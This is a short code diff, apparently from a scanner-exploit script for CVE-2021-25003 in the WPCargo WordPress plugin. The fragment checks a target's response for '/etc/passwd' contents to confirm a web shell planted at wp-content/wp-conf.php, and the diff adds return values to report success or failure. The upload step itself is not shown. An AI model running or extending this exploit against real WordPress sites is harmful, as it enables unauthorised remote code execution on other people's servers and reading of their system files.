@@ -20,13 +20,15 @@ def wpcargo_exploit(profile_url, timeout=5):
 
         if 'root:x:0:0:root' in validation_shell.text:
             print(f'[-] Shell successfully uploaded at {profile_url}wp-content/wp-conf.php')
+            return True
         else:
             print(f'[+] Shell upload attempt failed at {profile_url}')
+            return False
     except Exception as e:
         print(f'[!] Request to {profile_url} failed: {e}')
+    return False
 
 def scan_cve_2021_25003(profile_url):
-
     wpcargo_exploit(profile_url)
 
 
